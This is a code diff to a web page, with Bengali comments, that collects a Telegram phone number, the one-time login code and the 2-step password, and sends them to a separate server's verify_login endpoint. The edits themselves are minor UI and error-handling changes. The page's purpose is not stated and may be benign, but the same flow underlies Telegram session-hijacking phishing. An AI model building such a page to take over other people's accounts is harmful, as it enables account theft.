@@ -94,7 +94,7 @@
         <div class="auth-step" id="step-2">
             <p style="font-size: 12px; color: var(--text-dim); margin-bottom: 15px;">Enter the 5-digit code from Telegram</p>
             <div class="input-box">
-                <input type="number" id="otp-code" placeholder="Enter OTP Code">
+                <input type="tel" id="otp-code" placeholder="Enter OTP Code">
             </div>
             <button class="btn-action" id="btn-verify" onclick="verifyOTP()">Verify Code</button>
         </div>
@@ -164,24 +164,34 @@
 
             const btn = document.getElementById('btn-verify');
             btn.disabled = true;
+            btn.innerText = "VERIFYING..."; // লোডিং ইন্ডিকেটর যোগ করা হলো
 
             try {
                 const res = await fetch(`${API_URL}/api/verify_login`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: fullNumber, code: otp })
+                    body: JSON.stringify({ 
+                        phone: fullNumber, 
+                        code: otp,
+                        password: null // পাসওয়ার্ড আপাতত নাল রাখুন
+                    })
                 });
                 const data = await res.json();
 
                 if (data.success) {
                     window.location.replace("/dashboard");
-                } else if (data.message.toLowerCase().includes("password")) {
+                } else if (data.message.toLowerCase().includes("password") || data.message.toLowerCase().includes("sessionpasswordneeded")) {
                     goToStep(3);
                 } else {
                     notify(data.message);
                 }
-            } catch (e) { notify("Verification Failed!"); }
-            finally { btn.disabled = false; }
+            } catch (e) { 
+                notify("Verification Failed! Check Server Log."); 
+            }
+            finally { 
+                btn.disabled = false; 
+                btn.innerText = "Verify Code";
+            }
         }
 
         async function verifyFinal() {
@@ -191,21 +201,34 @@
 
             if (!pwd) return notify("Enter 2-Step Password!");
 
+            const btn = document.getElementById('btn-final');
+            btn.disabled = true;
+            btn.innerText = "ACCESSING...";
+
             try {
                 const res = await fetch(`${API_URL}/api/verify_login`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: fullNumber, code: otp, password: pwd })
+                    body: JSON.stringify({ 
+                        phone: fullNumber, 
+                        code: otp, 
+                        password: pwd 
+                    })
                 });
                 const data = await res.json();
 
                 if (data.success) {
                     window.location.replace("/dashboard");
                 } else {
-                    notify("Invalid 2-Step Password!");
+                    notify("Invalid 2-Step Password or Session Expired!");
                 }
-            } catch (e) { notify("Login Error!"); }
-        }
+            } catch (e) { 
+                notify("Login Error!"); 
+            } finally {
+                btn.disabled = false;
+                btn.innerText = "Access Account";
+            }
+            }
     </script>
 </body>
 </html>
